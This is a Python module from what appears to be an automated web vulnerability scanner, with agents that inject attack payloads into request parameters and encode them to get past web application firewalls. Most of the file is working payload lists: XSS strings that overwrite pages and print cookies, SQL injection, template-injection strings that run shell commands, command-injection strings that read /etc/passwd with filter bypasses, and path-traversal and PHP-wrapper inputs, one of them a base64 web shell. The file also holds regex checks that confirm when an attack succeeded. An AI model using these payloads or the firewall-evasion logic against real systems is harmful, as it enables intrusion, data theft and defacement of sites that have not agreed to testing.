from typing import AsyncIterator, List, Optional
import copy
from .base import BaseSpecialist
from ..models import MutableRequest, MutationStrategy

class PayloadAgent(BaseSpecialist):
    """
    Specialist in injecting payloads into parameters and body.
    
    XSS STRATEGY (Bug Bounty Accepted):
    - alert(1) is often sandboxed and NOT accepted by bug bounty programs
    - We use payloads that inject VISIBLE text with document.domain/cookie
    - Unique BUGTRACE marker makes vision validation reliable
    """
    
    # Unique marker for vision validation (easily recognizable)
    XSS_MARKER = "BUGTRACE-XSS-CONFIRMED"
    
    # Professional XSS payloads that inject visible proof
    PAYLOADS = {
        "XSS": [
            # Level 1: Simple injection with visible marker (vision can read this)
            f'<div style="color:red;font-size:30px;position:fixed;top:0;left:0;z-index:9999;background:yellow;padding:20px">HACKED BY BUGTRACE: <script>document.write(document.domain)</script></div>',
            
            # Level 2: Script-based with visible output
            f'"><script>document.body.innerHTML="<h1 style=color:red>HACKED BY BUGTRACE</h1><h2>Domain: "+document.domain+"</h2>"</script>',
            
            # Level 3: IMG onerror with visible marker (bypasses some filters)
            f'"><img src=x onerror="document.body.innerHTML=\'<h1 style=background:yellow;color:red;font-size:40px>{XSS_MARKER}</h1><p>Domain: \'+document.domain">',
            
            # Level 4: SVG-based (often bypasses WAF)
            f'"><svg/onload="document.body.innerHTML=\'<div style=font-size:50px;color:red>HACKED BY BUGTRACE</div>\'">',
            
            # Level 5: Details/ontoggle (modern bypass)
            f'<details open ontoggle="document.body.innerHTML=\'<h1>{XSS_MARKER}</h1><p>Cookie: \'+document.cookie">',
            
            # Level 6: Focus-based (user interaction not needed for auto-focus)
            f'"><input autofocus onfocus="document.body.innerHTML=\'<h1 style=color:red>{XSS_MARKER}</h1>\'">',
            
            # Level 7: Legacy alert for browser dialog detection (backup)
            '<script>alert(document.domain)</script>',
            '"><img src=x onerror=alert(document.domain)>',

            # Level 10: USER SUGGESTED VISUAL BREAKOUT (Proven Winner)
            "';{const d=document.createElement('div');d.style='position:fixed;top:0;width:100%;height:100px;background:red;color:white;text-align:center;z-index:9999;padding:10px;font-size:30px;';d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d)};//",
        ],
        "SQLI": [
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "admin' --",
            "1' AND SLEEP(5)--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' AND 1=CONVERT(int,(SELECT @@version))--",
            "' OR 'x'='x",
            "1; SELECT * FROM users--",
            "' WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
        ],

        # SSTI - Server-Side Template Injection
        "SSTI": [
            # Polyglot probes (detect template engine)
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
            "${{7*7}}", "{{7*'7'}}", "{{config}}",
            # Jinja2 / Flask
            "{{self.__class__.__mro__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.items()}}",
            "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            # Twig
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            # Freemarker
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            # Java EL / Spring
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(java.lang.System).getenv()}",
            # Smarty
            "{php}echo 'BUGTRACE';{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"PWNED\",self::clearConfig())}",
            # Pebble
            "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}",
            # Velocity
            "#set($x='')##$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')",
            # Generic Node.js
            "{{constructor.constructor('return this')()}}",
            "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        ],

        # CMD - Command Injection
        "CMD": [
            # Unix separators
            "; id", "| id", "|| id", "&& id", "& id",
            "`id`", "$(id)", "$((1+1))",
            # Newline injection
            "\nid\n", "%0aid%0a", "%0d%0aid",
            # Cat passwd variations
            "; cat /etc/passwd", "| cat /etc/passwd",
            "& cat /etc/passwd &", "|| cat /etc/passwd",
            # Echo markers for blind
            ";echo BUGTRACE", "|echo BUGTRACE",
            "& echo BUGTRACE &", "|| echo BUGTRACE",
            # Whoami
            "; whoami", "| whoami", "& whoami",
            # Time-based (blind)
            "; sleep 5", "| sleep 5", "& sleep 5 &",
            "`sleep 5`", "$(sleep 5)",
            # Windows
            "& dir", "| dir", "|| dir",
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| ping -n 5 127.0.0.1",
            # Bypass filters
            ";{cat,/etc/passwd}", "cat${IFS}/etc/passwd",
            "c'a't /etc/passwd", "c\"a\"t /etc/passwd",
            "/???/??t /???/p??s??",  # /bin/cat /etc/passwd glob
        ],

        # LFI - Local File Inclusion / Path Traversal
        "LFI": [
            # Basic traversal
            "../../../etc/passwd",
            "..\\..\\..\\etc\\passwd",
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            # Encoded traversal
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "....//....//....//etc/passwd",
            r"....\/....\/....\/etc/passwd",
            # Wrapper attacks (PHP)
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
            "expect://id",
            # Direct paths
            "file:///etc/passwd",
            "/etc/passwd",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            # Windows
            "..\\..\\..\\windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "file:///C:/Windows/System32/drivers/etc/hosts",
        ],
    }

    async def analyze(self, request: MutableRequest) -> bool:
        # Relevant if there are parameters or body to inject
        return bool(request.params or request.data or request.json_payload)

    async def generate_mutations(self, request: MutableRequest, strategies: List[MutationStrategy]) -> AsyncIterator[MutableRequest]:
        if MutationStrategy.PAYLOAD_INJECTION not in strategies:
            return

        # Target parameters
        target_keys = list(request.params.keys())
        
        # very basic strategy: inject into each parameter
        for vuln_type, payloads in self.PAYLOADS.items():
            for payload in payloads:
                for param in target_keys:
                    mutation = copy.deepcopy(request)
                    # Inject in existing param
                    mutation.params[param] = payload
                    yield mutation
                    
                    # Also try appending
                    mutation_append = copy.deepcopy(request)
                    mutation_append.params[param] = mutation_append.params[param] + payload
                    yield mutation_append

    # ==================== SUCCESS VALIDATORS ====================
    # Fast regex/substring checks for vulnerability confirmation
    # Keeps detection logic modular and out of orchestrator

    @staticmethod
    def check_xss_success(body: str, payloads_used: List[str]) -> bool:
        """Detect XSS success via markers or payload reflection."""
        markers = [
            "BUGTRACE-XSS-CONFIRMED", "BUGTRACE-XSS",
            "HACKED BY BUGTRACE", "HACKED BY BUGTRACEAI",
            "<script>document.write", "document.body.innerHTML"
        ]
        if any(m in body for m in markers):
            return True
        for payload in payloads_used:
            p = str(payload)
            if "alert(" in p and p in body:
                return True
        return False

    @staticmethod
    def check_sqli_success(body: str) -> bool:
        """Detect SQL injection via error signatures."""
        errors = [
            "SQL syntax", "mysql_fetch", "Warning: mysql",
            "Unclosed quotation mark", "quoted string not properly terminated",
            "PostgreSQL query failed", "ODBC SQL Server Driver",
            "OLE DB Provider for SQL Server", "java.sql.SQLException",
            "SQLite/JDBCDriver", "SqlClient.SqlException",
            "ORA-", "PLS-", "Microsoft SQL Native Client",
            "SQLSTATE[", "pg_query", "sqlite_", "mysql_num_rows",
        ]
        lower = body.lower()
        return any(e.lower() in lower for e in errors)

    @staticmethod
    def check_ssti_success(body: str) -> bool:
        """Detect SSTI success via template evaluation markers."""
        indicators = [
            "49",  # 7*7
            "__class__", "__mro__", "__subclasses__",
            "class 'str'", "class 'dict'", "class 'list'",
            "<Config", "SECRET_KEY", "DEBUG",
            "jinja2", "TemplateError", "UndefinedError",
            "freemarker", "velocity", "Smarty",
            "subprocess.Popen", "os.popen",
        ]
        return any(i in body for i in indicators)

    @staticmethod
    def check_cmd_success(body: str) -> bool:
        """Detect command injection success."""
        indicators = [
            "uid=", "gid=", "groups=",
            "root:x:0:0", "daemon:x:", "bin:x:", "nobody:x:",
            "/bin/bash", "/bin/sh", "/usr/bin/",
            "www-data", "apache", "nginx",
            "BUGTRACE",  # our echo marker
            "Windows IP Configuration", "Volume Serial Number",
            "Directory of C:\\",
        ]
        return any(i in body for i in indicators)

    @staticmethod
    def check_lfi_success(body: str) -> bool:
        """Detect LFI/path traversal success."""
        indicators = [
            "root:x:0:0", "daemon:x:", "nobody:x:", "bin:x:",
            "[boot loader]", "[extensions]", "[fonts]",
            "HTTP_USER_AGENT", "DOCUMENT_ROOT", "SERVER_SOFTWARE",
            "<?php", "<?=",  # PHP source disclosure
            "PK\x03\x04",  # ZIP header
            "/sbin/nologin", "/bin/false",
            "; for 16-bit app support",  # win.ini
        ]
        return any(i in body for i in indicators)

    @staticmethod
    def detect_blood_smell(status_code: int, body: str, original_length: int) -> dict:
        """
        PHASE 2 HOOK: Detect signals that warrant LLM analysis.
        Returns dict with smell indicators for agentic fallback.
        """
        smells = {
            "has_smell": False,
            "reasons": [],
            "severity": 0,  # 0-10 scale
        }

        # 500 errors = server-side issue, possible injection
        if status_code >= 500:
            smells["has_smell"] = True
            smells["reasons"].append(f"server_error_{status_code}")
            smells["severity"] += 4

        # WAF blocks
        if status_code in (403, 406, 429):
            smells["has_smell"] = True
            smells["reasons"].append(f"waf_block_{status_code}")
            smells["severity"] += 3

        # Partial reflection (payload chars appear but transformed)
        reflection_markers = ["&lt;script", "&quot;", "\\x3c", "\\u003c"]
        if any(m in body for m in reflection_markers):
            smells["has_smell"] = True
            smells["reasons"].append("partial_reflection")
            smells["severity"] += 2

        # Significant length change (>50% different)
        if original_length > 0:
            length_diff = abs(len(body) - original_length) / original_length
            if length_diff > 0.5:
                smells["has_smell"] = True
                smells["reasons"].append(f"length_anomaly_{int(length_diff*100)}pct")
                smells["severity"] += 2

        # Error keywords without full disclosure
        error_hints = ["error", "exception", "invalid", "unexpected", "syntax"]
        if any(h in body.lower() for h in error_hints) and smells["severity"] < 3:
            smells["has_smell"] = True
            smells["reasons"].append("error_keywords")
            smells["severity"] += 1

        return smells


from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques

class EncodingAgent(BaseSpecialist):
    """
    Specialist in encoding payloads to bypass WAFs.

    UPDATED: Now uses intelligent WAF fingerprinting and strategy selection.
    """

    def __init__(self):
        self.detected_waf: str = "unknown"
        self.selected_strategies: List[str] = []

    async def analyze(self, request: MutableRequest) -> bool:
        """
        Analyze the target and detect WAF.
        """
        # Detect WAF for this target
        self.detected_waf, confidence = await waf_fingerprinter.detect(request.url)

        # Get best strategies for this WAF
        _, self.selected_strategies = await strategy_router.get_strategies_for_target(request.url)

        return True

    async def generate_mutations(
        self,
        request: MutableRequest,
        strategies: List[MutationStrategy]
    ) -> AsyncIterator[MutableRequest]:
        """
        Generate encoded mutations using intelligent strategy selection.
        """
        if MutationStrategy.BYPASS_WAF not in strategies:
            return

        # Ensure we have strategies
        if not self.selected_strategies:
            await self.analyze(request)

        # Generate encoded variants for each parameter value
        for k, v in request.params.items():
            async for mutation in self._generate_param_mutations(request, k, v):
                yield mutation

    async def _generate_param_mutations(
        self,
        request: MutableRequest,
        param_key: str,
        param_value: str
    ) -> AsyncIterator[MutableRequest]:
        """Generate mutations for a single parameter using selected strategies."""
        # Apply SPECIFIC strategies from router (not generic WAF-based)
        for strategy_name in self.selected_strategies:
            try:
                mutation = self._apply_encoding_strategy(request, param_key, param_value, strategy_name)
                if mutation:
                    yield mutation
            except Exception:
                # Log but continue
                pass

    def _apply_encoding_strategy(
        self,
        request: MutableRequest,
        param_key: str,
        param_value: str,
        strategy_name: str
    ) -> Optional[MutableRequest]:
        """Apply encoding strategy to parameter and return mutation if successful."""
        # Get the specific encoding technique
        technique = encoding_techniques.get_technique_by_name(strategy_name)
        if not technique:
            return None

        encoded_value = technique.encoder(str(param_value))
        if encoded_value == str(param_value):
            return None  # Only if encoding changed something

        mutation = copy.deepcopy(request)
        mutation.params[param_key] = encoded_value
        mutation._encoding_strategy = strategy_name
        return mutation

    def record_success(self, request: MutableRequest):
        """
        Call this when a mutation successfully bypassed the WAF.
        This feeds the learning system.
        """
        strategy = getattr(request, '_encoding_strategy', 'unknown')
        if strategy != 'unknown' and self.detected_waf != 'unknown':
            strategy_router.record_result(self.detected_waf, strategy, success=True)

    def record_failure(self, request: MutableRequest):
        """
        Call this when a mutation was blocked.
        This feeds the learning system.
        """
        strategy = getattr(request, '_encoding_strategy', 'unknown')
        if strategy != 'unknown' and self.detected_waf != 'unknown':
            strategy_router.record_result(self.detected_waf, strategy, success=False)
